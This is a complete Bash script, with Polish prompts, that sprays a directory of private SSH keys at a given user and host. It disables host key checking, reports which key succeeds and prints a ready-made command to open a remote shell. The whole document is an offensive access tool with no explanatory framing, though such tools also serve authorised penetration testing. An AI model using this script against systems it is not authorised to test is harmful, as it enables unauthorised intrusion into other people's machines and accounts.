#!/usr/bin/env bash
set -euo pipefail

if [[ $# -ne 3 ]]; then
echo "Użycie: $0 <target_ip_or_host> <user> <keys_dir>"
exit 1
fi

TARGET="$1"
USER="$2"
KEYDIR="$3"

if [[ ! -d "$KEYDIR" ]]; then
echo "Błąd: katalog z kluczami nie istnieje: $KEYDIR"
exit 2
fi
command -v ssh >/dev/null || { echo "Brak ssh w PATH"; exit 3; }

mapfile -t KEYS < <(find "$KEYDIR" -maxdepth 1 -type f ! -name "*.pub" -print0 | xargs -0 -I{} echo "{}")
TOTAL="${#KEYS[@]}"
if (( TOTAL == 0 )); then
echo "Brak plików kluczy w $KEYDIR"
exit 4
fi

echo "[] Target: $USER@$TARGET"
echo "[] Klucze do sprawdzenia: $TOTAL"

SSH_OPTS=(-o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5)

HIT=""
for ((i=0; i<TOTAL; i++)); do
key="${KEYS[$i]}"
chmod 600 "$key" 2>/dev/null || true
printf "\r[] [%d/%d] %s" "$((i+1))" "$TOTAL" "$(basename "$key")"
if ssh -i "$key" "${SSH_OPTS[@]}" "$USER@$TARGET" true &>/dev/null; then
HIT="$key"
echo
echo "[+] Trafienie: $HIT"
echo "[] Uruchom powłokę:"
echo "ssh -i "$HIT" ${SSH_OPTS[*]} $USER@$TARGET"
exit 0
fi
done

echo
echo "[-] Brak dopasowania po sprawdzeniu $TOTAL kluczy w: $KEYDIR"
exit 5
